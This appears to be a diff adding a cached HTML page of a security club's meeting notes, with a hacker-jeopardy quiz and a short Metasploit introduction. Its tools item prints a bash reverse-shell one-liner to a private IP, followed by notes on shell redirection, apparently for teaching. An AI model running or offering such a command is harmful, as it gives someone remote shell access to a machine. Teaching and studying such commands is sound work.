@@ -1,0 +1,43 @@
+I"Ç<h1 id="meeting-notes-oct-10-2019">Meeting Notes Oct. 10, 2019:</h1>
+
+<h2 id="hacker-jeopardy---scrypy">Hacker Jeopardy -&gt; @scrypy</h2>
+<ul>
+  <li><strong>Newz:</strong>
+    <ul>
+      <li>This popular electronic doorbell has decided to partner with police departments and provide them easy access to footage recorded on the device. (Amazon Ring)</li>
+    </ul>
+  </li>
+  <li><strong>Toolz:</strong>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.0.99.45/80 0&gt;&amp;1</code></li>
+      <li>redirection notes
+```
+There are two formats for  redirecting  standard  output  and  standard
+error:
+     &amp;&gt;word
+and
+     &gt;&amp;word</li>
+    </ul>
+
+    <p>Of the two forms, the first is preferred.  This is semantically equiva-
+lent to
+       &gt;word 2&gt;&amp;1</p>
+
+    <p>stdin=0 - stdout=1 - stderr=2
+```</p>
+  </li>
+  <li><strong>Knawledge:</strong>
+    <ul>
+      <li>This is the basic idea behind the famous Heartbleed Vulnerability https://xkcd.com/1354/</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="metasploit-intro---scrypy">Metasploit Intro -&gt; @scrypy</h2>
+<ul>
+  <li>Basics of working through an exploit using Metasploit.</li>
+</ul>
+
+<p><br />
+@scrypy</p>
+:ET
